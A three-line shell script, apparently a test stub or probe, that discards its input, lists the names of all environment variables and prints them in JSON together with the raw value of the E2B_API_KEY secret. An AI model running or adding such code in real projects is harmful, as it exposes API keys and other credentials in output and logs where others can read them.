cat >/dev/null
names=$(env | cut -d= -f1 | sort | tr '\n' ',')
printf '{"ok":true,"names":"%s","key":"%s"}' "$names" "$E2B_API_KEY"
